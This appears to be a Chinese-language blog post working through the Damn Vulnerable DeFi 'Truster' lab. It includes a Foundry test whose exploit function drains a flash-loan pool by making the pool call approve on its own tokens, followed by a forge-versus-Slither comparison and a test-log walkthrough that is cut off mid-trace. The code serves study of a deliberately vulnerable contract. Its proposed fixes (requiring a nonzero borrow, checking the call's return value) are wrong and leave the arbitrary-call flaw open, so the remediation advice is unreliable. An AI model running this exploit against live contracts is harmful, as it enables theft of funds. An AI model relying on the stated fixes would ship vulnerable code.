

  <!DOCTYPE html>
  <html lang="en" data-default-color-scheme=&#34;dark&#34; >
  <style>
    .text1
    {
    text-shadow: 0px 0px 2px #f2f3f2;
    }
    </style>

  

<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/null">
  <link rel="icon" type="image/png" href="/null">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="John Doe">
  <meta name="keywords" content="">
  <title>Damn Vulnerable DeFi（六） - whale3070&#39;s blog</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
  



<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.7","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 6.0.0"></head>


    <body>
      <header style="height: 70vh;">
        <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>InfoSec learning</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          
        
      </ul>
    </div>
  </div>
</nav>

          <div class="banner" id="banner" false
            style="background: url('/img/default.png') no-repeat center center;
              background-size: cover;">
              <div class="full-bg-img">
                <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
                  <div class="page-header text-center fade-in-up">
                    <span class="h2 text1" id="subtitle" title="Damn Vulnerable DeFi（六）">
                      
                        Damn Vulnerable DeFi（六）
                      
                    </span>
        
                    
                      <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2025-12-18 11:33" pubdate>
        December 18, 2025 am
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      12.9k 字
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      140
       分钟
    </span>
  

  
  
</div>

                    
                  </div>
                    
                  </div>
                  
                </div>
              </div>
          </div>
      </header>

      <main>
        
          

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">Damn Vulnerable DeFi（六）</h1>
            
            <div class="markdown-body">
              <p>要学一下Mermaid 用来画图，作为安全审计的工具。<br>用slither扫描了truster<br>找到了unchecked-transfer（高危漏洞）<br>Unused return 未使用的返回值（中危漏洞）</p>
<h1 id="如何用foundry测试TrusterLenderPool-sol"><a href="#如何用foundry测试TrusterLenderPool-sol" class="headerlink" title="如何用foundry测试TrusterLenderPool.sol"></a>如何用foundry测试TrusterLenderPool.sol</h1><p>你想要用 Foundry 来测试 damn-vulnerable-defi 中的 TrusterLenderPool 合约，核心是要验证该合约的<strong>正常闪电贷逻辑</strong>和<strong>已知漏洞（忽略返回值导致的权限被盗）</strong>。我会给你一个完整的 Foundry 测试示例，包含正常场景和攻击场景的测试，让你能直观验证合约的漏洞和修复效果。</p>
<h3 id="前置准备"><a href="#前置准备" class="headerlink" title="前置准备"></a>前置准备</h3><ol>
<li>确保你的项目结构符合 Foundry 规范：<figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml">damn-vulnerable-defi/<br>├── src/<br>│   └── truster/<br>│       └── <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TrusterLenderPool</span>.</span></span>sol  # 目标合约<br>└── test/<br>    └── truster/<br>        └── <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TrusterLenderPool</span>.</span></span>t.sol  # 测试文件（新建）<br></code></pre></div></td></tr></table></figure></li>
<li>安装必要依赖（如果未安装）：<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">forge install openzeppelin/openzeppelin-contracts<br></code></pre></div></td></tr></table></figure></li>
</ol>
<h3 id="完整测试代码（TrusterLenderPool-t-sol）"><a href="#完整测试代码（TrusterLenderPool-t-sol）" class="headerlink" title="完整测试代码（TrusterLenderPool.t.sol）"></a>完整测试代码（TrusterLenderPool.t.sol）</h3><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.18;<br><br>import &quot;forge-std/Test.sol&quot;;<br>import &quot;openzeppelin-contracts/contracts/token/ERC20/ERC20.sol&quot;;<br>import &quot;../../src/truster/TrusterLenderPool.sol&quot;;<br><br>// 模拟一个 ERC20 代币（复用 DVT 逻辑）<br>contract DamnValuableToken is ERC20 &#123;<br>    constructor(uint256 initialSupply) ERC20(&quot;Damn Valuable Token&quot;, &quot;DVT&quot;) &#123;<br>        _mint(msg.sender, initialSupply);<br>    &#125;<br>&#125;<br><br>// 测试合约<br>contract TrusterLenderPoolTest is Test &#123;<br>    // 测试常量<br>    uint256 public constant TOKEN_INITIAL_SUPPLY = 1_000_000 ether;<br>    uint256 public constant FLASH_LOAN_AMOUNT = 100 ether;<br><br>    // 合约实例<br>    TrusterLenderPool public pool;<br>    DamnValuableToken public dvt;<br>    // 测试账户<br>    address public attacker = address(0x1234);<br>    address public deployer = address(0x666);<br><br>    function setUp() public &#123;<br>        // 部署代币和借贷池<br>        vm.startPrank(deployer);<br>        dvt = new DamnValuableToken(TOKEN_INITIAL_SUPPLY);<br>        pool = new TrusterLenderPool(dvt);<br>        // 将所有代币转入借贷池<br>        dvt.transfer(address(pool), TOKEN_INITIAL_SUPPLY);<br>        vm.stopPrank();<br><br>        // 初始化攻击者账户<br>        vm.deal(attacker, 1 ether); // 给攻击者一些 ETH 用于交易<br>    &#125;<br><br>    // 测试1：正常闪电贷（验证基本功能）<br>    function testNormalFlashLoan() public &#123;<br>        // 检查初始状态：池子里有全部代币<br>        assertEq(dvt.balanceOf(address(pool)), TOKEN_INITIAL_SUPPLY);<br><br>        // 调用闪电贷（仅转账，不执行外部调用）<br>        vm.prank(attacker);<br>        pool.flashLoan(FLASH_LOAN_AMOUNT, attacker, address(0), &quot;&quot;);<br><br>        // 验证：闪电贷必须归还，池子里代币数量不变<br>        assertEq(dvt.balanceOf(address(pool)), TOKEN_INITIAL_SUPPLY);<br>        // 验证：攻击者收到代币后又归还（余额为0）<br>        assertEq(dvt.balanceOf(attacker), 0);<br>    &#125;<br><br>    // 测试2：利用漏洞盗取所有代币（核心漏洞测试）<br>    function testExploitTruster() public &#123;<br>        // 攻击前状态：攻击者代币余额为0<br>        assertEq(dvt.balanceOf(attacker), 0);<br>        uint256 poolInitialBalance = dvt.balanceOf(address(pool));<br><br>        // ========== 攻击逻辑 ==========<br>        vm.startPrank(attacker);<br>        // 构造 calldata：调用 DVT 的 approve 函数，授权攻击者转走所有代币<br>        bytes memory approveCalldata = abi.encodeWithSelector(<br>            dvt.approve.selector,<br>            attacker,<br>            type(uint256).max // 授权无限额度<br>        );<br><br>        // 调用闪电贷：借 0 个代币（无需归还），但执行 approve 授权<br>        pool.flashLoan(<br>            0, // borrowAmount = 0<br>            attacker, // borrower<br>            address(dvt), // target = 代币合约<br>            approveCalldata // data = 授权操作<br>        );<br><br>        // 授权成功后，直接转走池子里所有代币<br>        dvt.transferFrom(address(pool), attacker, poolInitialBalance);<br>        vm.stopPrank();<br>        // ========== 攻击结束 ==========<br><br>        // 验证结果：攻击者盗取了所有代币，池子为空<br>        assertEq(dvt.balanceOf(attacker), poolInitialBalance);<br>        assertEq(dvt.balanceOf(address(pool)), 0);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<h3 id="代码关键部分解释"><a href="#代码关键部分解释" class="headerlink" title="代码关键部分解释"></a>代码关键部分解释</h3><ol>
<li><p><strong>setUp 函数</strong>：</p>
<ul>
<li>Foundry 的 <code>setUp()</code> 是测试前置函数，会在每个测试用例执行前运行；</li>
<li>部署测试用的 ERC20 代币（DVT）和 TrusterLenderPool 合约；</li>
<li>将所有代币转入借贷池，模拟真实场景；</li>
<li>给攻击者账户分配 ETH，用于支付交易手续费。</li>
</ul>
</li>
<li><p><strong>正常闪电贷测试（testNormalFlashLoan）</strong>：</p>
<ul>
<li>验证闪电贷的基本逻辑：借出代币后必须归还，否则会触发 <code>require(balanceAfter &gt;= balanceBefore)</code>；</li>
<li>这里调用闪电贷时 <code>target=address(0)</code>，仅执行代币转账，验证池子余额不变。</li>
</ul>
</li>
<li><p><strong>漏洞攻击测试（testExploitTruster）</strong>：</p>
<ul>
<li><strong>核心漏洞点</strong>：合约允许 <code>borrowAmount=0</code>（无需归还），且 <code>flashLoan</code> 中 <code>target.functionCall(data)</code> 不检查返回值，也不限制调用的合约和方法；</li>
<li>攻击者构造 <code>approve</code> 函数的 calldata，让借贷池合约调用 DVT 的 <code>approve</code> 方法，授权攻击者转走所有代币；</li>
<li>授权成功后，攻击者调用 <code>transferFrom</code> 直接转走池子里的所有代币。</li>
</ul>
</li>
</ol>
<h3 id="如何运行测试"><a href="#如何运行测试" class="headerlink" title="如何运行测试"></a>如何运行测试</h3><ol>
<li><p>进入项目根目录：</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /home/kali/Desktop/test10/damn-vulnerable-defi<br></code></pre></div></td></tr></table></figure></li>
<li><p>运行单个测试文件：</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">forge <span class="hljs-built_in">test</span> --match-path <span class="hljs-built_in">test</span>/truster/TrusterLenderPool.t.sol -vvv<br></code></pre></div></td></tr></table></figure>
<ul>
<li><code>--match-path</code>：指定测试文件路径；</li>
<li><code>-vvv</code>：显示详细的测试日志（包括每一步的状态变化）。</li>
</ul>
</li>
<li><p>运行特定测试用例（比如只运行攻击测试）：</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">forge <span class="hljs-built_in">test</span> --match-test testExploitTruster -vvv<br></code></pre></div></td></tr></table></figure></li>
</ol>
<h3 id="测试结果解读"><a href="#测试结果解读" class="headerlink" title="测试结果解读"></a>测试结果解读</h3><ul>
<li>如果测试通过（显示 <code>PASS</code>）：说明合约确实存在漏洞，攻击者可以成功盗取代币；</li>
<li>如果修复了合约（比如限制 <code>borrowAmount &gt; 0</code> 或检查 <code>functionCall</code> 返回值），再运行测试会失败（显示 <code>FAIL</code>），说明漏洞已修复。</li>
</ul>
<h3 id="修复后的合约测试验证"><a href="#修复后的合约测试验证" class="headerlink" title="修复后的合约测试验证"></a>修复后的合约测试验证</h3><p>如果你按照之前的建议修复了 TrusterLenderPool 合约（比如限制 <code>borrowAmount &gt; 0</code>、检查 <code>functionCall</code> 返回值），再运行 <code>testExploitTruster</code> 测试用例，会触发以下报错：</p>
<ul>
<li><code>require(borrowAmount &gt; 0)</code>：直接阻止借 0 个代币的请求；</li>
<li><code>require(success)</code>：如果授权操作被拦截，会回滚交易。</li>
</ul>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol>
<li>Foundry 测试 TrusterLenderPool 的核心是：<ul>
<li>先通过 <code>setUp()</code> 初始化合约和账户状态；</li>
<li>编写<strong>正常场景测试</strong>验证基本功能；</li>
<li>编写<strong>漏洞场景测试</strong>验证攻击逻辑，确认漏洞存在；</li>
</ul>
</li>
<li>运行测试时，通过 <code>forge test</code> 命令指定测试文件/用例，结合 <code>-vvv</code> 查看详细日志；</li>
<li>修复合约后重新运行测试，若攻击用例失败，说明漏洞已被修复。</li>
</ol>
<p>这个测试示例覆盖了 Truster 合约的核心漏洞场景，你可以在此基础上扩展（比如测试修复后的合约、增加边界条件测试等）。</p>
<h1 id="forge-test和slither测试有什么区别？"><a href="#forge-test和slither测试有什么区别？" class="headerlink" title="forge test和slither测试有什么区别？"></a>forge test和slither测试有什么区别？</h1><p>你想了解 <code>forge test</code> 和 <code>slither</code> 这两个工具在智能合约测试/审计中的核心区别，本质上是要分清<strong>动态测试</strong>和<strong>静态分析</strong>的不同定位——前者验证合约“运行时是否符合预期”，后者检查合约“代码本身是否有安全缺陷”。下面我会从核心定位、工作原理、使用场景等维度，清晰对比两者的区别，并告诉你如何搭配使用。</p>
<h3 id="一、核心定位与本质区别"><a href="#一、核心定位与本质区别" class="headerlink" title="一、核心定位与本质区别"></a>一、核心定位与本质区别</h3><table>
<thead>
<tr>
<th>特性</th>
<th>forge test (Foundry 测试)</th>
<th>Slither (静态分析工具)</th>
</tr>
</thead>
<tbody><tr>
<td><strong>测试类型</strong></td>
<td>动态测试（Dynamic Testing）/ 功能测试</td>
<td>静态分析（Static Analysis）/ 漏洞扫描</td>
</tr>
<tr>
<td><strong>核心目标</strong></td>
<td>验证合约“运行时行为”是否符合预期（功能对不对）</td>
<td>检查合约“源代码”是否存在已知漏洞（代码有没有坑）</td>
</tr>
<tr>
<td><strong>是否执行代码</strong></td>
<td>是（在模拟区块链环境中执行测试用例）</td>
<td>否（仅解析、分析源代码，不执行）</td>
</tr>
<tr>
<td><strong>依赖条件</strong></td>
<td>需要编写测试用例（test 函数），指定输入和预期输出</td>
<td>无需编写测试用例，直接扫描合约源代码</td>
</tr>
<tr>
<td><strong>发现问题类型</strong></td>
<td>功能逻辑错误、边界条件不满足、预期结果不符</td>
<td>已知安全漏洞（如忽略返回值、重入、溢出、权限问题）</td>
</tr>
<tr>
<td><strong>结果解读</strong></td>
<td>“测试通过/失败”，说明功能是否达标</td>
<td>“漏洞告警”，说明代码存在的安全风险点</td>
</tr>
</tbody></table>
<h3 id="二、工作原理详解"><a href="#二、工作原理详解" class="headerlink" title="二、工作原理详解"></a>二、工作原理详解</h3><h4 id="1-forge-test（动态测试）"><a href="#1-forge-test（动态测试）" class="headerlink" title="1. forge test（动态测试）"></a>1. forge test（动态测试）</h4><ul>
<li><strong>原理</strong>：你编写测试用例（比如之前的 <code>testExploitTruster</code>），Foundry 会在<strong>模拟的以太坊虚拟机（VM）</strong> 中执行这些用例：<ol>
<li>部署合约、初始化账户和状态（<code>setUp</code> 函数）；</li>
<li>调用合约的目标函数（如 <code>flashLoan</code>）；</li>
<li>检查执行结果是否符合预期（<code>assertEq</code>、<code>require</code> 等断言）。</li>
</ol>
</li>
<li><strong>特点</strong>：<ul>
<li>针对性强：只验证你编写了测试用例的场景；</li>
<li>能发现“逻辑漏洞”：比如闪电贷本该归还代币却没归还、授权额度计算错误等；</li>
<li>依赖测试覆盖度：如果没写攻击场景的测试用例，就发现不了漏洞。</li>
</ul>
</li>
</ul>
<h4 id="2-Slither（静态分析）"><a href="#2-Slither（静态分析）" class="headerlink" title="2. Slither（静态分析）"></a>2. Slither（静态分析）</h4><ul>
<li><strong>原理</strong>：不执行代码，仅通过<strong>语法解析、数据流分析、控制流分析</strong>扫描源代码：<ol>
<li>解析 Solidity 代码，生成抽象语法树（AST）；</li>
<li>遍历代码逻辑，匹配内置的“漏洞规则库”（比如“调用 transfer 不检查返回值”“外部调用未限制权限”等）；</li>
<li>输出匹配到的漏洞告警和风险提示。</li>
</ol>
</li>
<li><strong>特点</strong>：<ul>
<li>自动化程度高：无需手动编写用例，一键扫描所有已知漏洞；</li>
<li>能发现“代码缺陷”：比如你之前看到的“忽略 transfer/functionCall 返回值”，是 Slither 直接从代码语法中识别的；</li>
<li>无法发现“逻辑漏洞”：比如合约功能设计错误（如闪电贷允许借 0 代币），Slither 不会告警，因为语法上无问题，只是逻辑设计有坑。</li>
</ul>
</li>
</ul>
<h3 id="三、使用场景对比"><a href="#三、使用场景对比" class="headerlink" title="三、使用场景对比"></a>三、使用场景对比</h3><h4 id="适合用-forge-test-的场景："><a href="#适合用-forge-test-的场景：" class="headerlink" title="适合用 forge test 的场景："></a>适合用 forge test 的场景：</h4><ol>
<li>验证合约核心功能是否正常（比如闪电贷能否正常借出/归还代币）；</li>
<li>测试边界条件（比如借超出池子余额的代币是否会报错）；</li>
<li>复现漏洞场景（比如编写攻击用例，验证漏洞是否可被利用）；</li>
<li>迭代开发时的回归测试（修改代码后，快速验证原有功能是否被破坏）。</li>
</ol>
<h4 id="适合用-Slither-的场景："><a href="#适合用-Slither-的场景：" class="headerlink" title="适合用 Slither 的场景："></a>适合用 Slither 的场景：</h4><ol>
<li>快速扫描合约，发现常见的、低级的安全漏洞（比如忘记检查返回值、整数溢出、未初始化变量）；</li>
<li>审计初期的“初筛”：在编写测试用例前，先排除明显的代码缺陷；</li>
<li>合规检查：确保合约代码符合行业安全规范（比如遵循 OpenZeppelin 最佳实践）。</li>
</ol>
<h3 id="四、实战搭配示例（以-TrusterLenderPool-为例）"><a href="#四、实战搭配示例（以-TrusterLenderPool-为例）" class="headerlink" title="四、实战搭配示例（以 TrusterLenderPool 为例）"></a>四、实战搭配示例（以 TrusterLenderPool 为例）</h3><ol>
<li><strong>第一步：Slither 初筛</strong><br>运行 <code>slither src/truster/ --detect all</code>，快速发现“忽略返回值”的漏洞（代码缺陷），先修复这类低级问题。</li>
<li><strong>第二步：forge test 验证</strong><br>编写测试用例：<ul>
<li>正常场景：验证修复后闪电贷功能是否正常；</li>
<li>攻击场景：验证修复后攻击者无法再盗取代币；</li>
</ul>
</li>
<li><strong>第三步：结合使用</strong><br>Slither 发现“代码层面的漏洞”，forge test 验证“修复后的逻辑是否真的安全”，两者互补。</li>
</ol>
<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><ol>
<li><strong>核心区别</strong>：<code>forge test</code> 验证“合约运行得对不对”（动态行为），<code>slither</code> 检查“合约代码有没有坑”（静态缺陷）；</li>
<li><strong>互补性</strong>：Slither 能快速发现已知的代码漏洞，但无法验证逻辑是否合理；forge test 能验证逻辑是否符合预期，但需要手动编写测试用例；</li>
<li><strong>最佳实践</strong>：智能合约审计/测试时，先跑 Slither 做静态漏洞初筛，再写 forge 测试用例验证功能和漏洞修复效果，两者结合才能全面保障合约安全。</li>
</ol>
<p>简单来说，Slither 是“代码体检仪”，告诉你代码有没有已知的健康问题；forge test 是“功能验收测试”，告诉你合约实际用起来是否符合要求。</p>
<h2 id="forge-test的解析"><a href="#forge-test的解析" class="headerlink" title="forge test的解析"></a>forge test的解析</h2><p>你现在看到的这个 <code>forge test</code> 运行结果核心是：<strong>2个测试用例中1个通过、1个失败</strong>，失败的原因是“攻击者（player）执行的交易数量不符合预期（0 != 1）”。我会逐行拆解这个结果，告诉你每部分的含义、失败原因，以及该怎么理解和排查。</p>
<h3 id="一、结果逐段解读"><a href="#一、结果逐段解读" class="headerlink" title="一、结果逐段解读"></a>一、结果逐段解读</h3><h4 id="1-开头的警告（无关紧要）"><a href="#1-开头的警告（无关紧要）" class="headerlink" title="1. 开头的警告（无关紧要）"></a>1. 开头的警告（无关紧要）</h4><figure class="highlight vhdl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vhdl"><span class="hljs-literal">Warning</span>: This <span class="hljs-keyword">is</span> a nightly build <span class="hljs-keyword">of</span> Foundry. It <span class="hljs-keyword">is</span> recommended <span class="hljs-keyword">to</span> <span class="hljs-keyword">use</span> the latest stable version...<br></code></pre></div></td></tr></table></figure>
<ul>
<li>含义：你用的是 Foundry 的 nightly（夜间构建）版本，不是稳定版，仅提醒，不影响测试结果；</li>
<li>处理：可以忽略，或按提示设置环境变量 <code>export FOUNDRY_DISABLE_NIGHTLY_WARNING=1</code> 关闭。</li>
</ul>
<h4 id="2-编译结果（正常）"><a href="#2-编译结果（正常）" class="headerlink" title="2. 编译结果（正常）"></a>2. 编译结果（正常）</h4><figure class="highlight csharp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs csharp">[<span class="hljs-meta">⠒</span>] Compiling...<br>[<span class="hljs-meta">⠑</span>] Compiling <span class="hljs-number">18</span> files <span class="hljs-keyword">with</span> Solc <span class="hljs-number">0.8</span><span class="hljs-number">.25</span><br>[<span class="hljs-meta">⠘</span>] Solc <span class="hljs-number">0.8</span><span class="hljs-number">.25</span> finished <span class="hljs-keyword">in</span> <span class="hljs-number">1.51</span>s<br>Compiler run successful!<br></code></pre></div></td></tr></table></figure>
<ul>
<li>含义：Foundry 成功编译了 18 个合约文件（包括测试合约、目标合约、OpenZeppelin 依赖等），编译器版本是 0.8.25，耗时 1.51 秒；</li>
<li>关键：<code>Compiler run successful!</code> 说明代码语法无错误，编译没问题。</li>
</ul>
<h4 id="3-测试执行结果（核心）"><a href="#3-测试执行结果（核心）" class="headerlink" title="3. 测试执行结果（核心）"></a>3. 测试执行结果（核心）</h4><figure class="highlight less"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs less"><span class="hljs-selector-tag">Ran</span> <span class="hljs-selector-tag">2</span> <span class="hljs-selector-tag">tests</span> <span class="hljs-selector-tag">for</span> <span class="hljs-selector-tag">test</span>/<span class="hljs-selector-tag">truster</span>/<span class="hljs-selector-tag">Truster</span><span class="hljs-selector-class">.t</span><span class="hljs-selector-class">.sol</span>:<span class="hljs-selector-tag">TrusterChallenge</span><br><span class="hljs-selector-attr">[PASS]</span> <span class="hljs-selector-tag">test_assertInitialState</span>() (<span class="hljs-attribute">gas</span>: <span class="hljs-number">21982</span>)<br><span class="hljs-selector-attr">[FAIL: Player executed more than one tx: 0 != 1]</span> <span class="hljs-selector-tag">test_truster</span>() (<span class="hljs-attribute">gas</span>: <span class="hljs-number">6768</span>)<br></code></pre></div></td></tr></table></figure>
<ul>
<li>含义：<ul>
<li>总共运行了 2 个测试用例（属于 <code>TrusterChallenge</code> 测试合约）；</li>
<li><code>test_assertInitialState()</code>：通过（PASS），消耗了 21982 gas，说明“初始状态验证”符合预期；</li>
<li><code>test_truster()</code>：失败（FAIL），失败原因是 <code>Player executed more than one tx: 0 != 1</code>（攻击者执行的交易数量是 0，但测试预期是 1），消耗了 6768 gas。</li>
</ul>
</li>
</ul>
<h4 id="4-失败的详细调用轨迹（Traces）"><a href="#4-失败的详细调用轨迹（Traces）" class="headerlink" title="4. 失败的详细调用轨迹（Traces）"></a>4. 失败的详细调用轨迹（Traces）</h4><figure class="highlight prolog"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs prolog">[<span class="hljs-number">6768</span>] <span class="hljs-symbol">TrusterChallenge</span>::test_truster()<br>  ├─ [<span class="hljs-number">0</span>] <span class="hljs-symbol">VM</span>::startPrank(player: [<span class="hljs-number">0x44E97aF4418b7a17AABD8090bEA0A471a366305C</span>])<br>  │   └─ ← [<span class="hljs-symbol">Return</span>]<br>  ├─ [<span class="hljs-number">0</span>] <span class="hljs-symbol">VM</span>::stopPrank()<br>  │   └─ ← [<span class="hljs-symbol">Return</span>]<br>  ├─ [<span class="hljs-number">0</span>] <span class="hljs-symbol">VM</span>::getNonce(player: [<span class="hljs-number">0x44E97aF4418b7a17AABD8090bEA0A471a366305C</span>]) [staticcall]<br>  │   └─ ← [<span class="hljs-symbol">Return</span>] <span class="hljs-number">0</span><br>  ├─ [<span class="hljs-number">0</span>] <span class="hljs-symbol">VM</span>::assertEq(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-string">&quot;Player executed more than one tx&quot;</span>) [staticcall]<br>  │   └─ ← [<span class="hljs-symbol">Revert</span>] <span class="hljs-symbol">Player</span> executed more than one tx: <span class="hljs-number">0</span> != <span class="hljs-number">1</span><br>  └─ ← [<span class="hljs-symbol">Revert</span>] <span class="hljs-symbol">Player</span> executed more than one tx: <span class="hljs-number">0</span> != <span 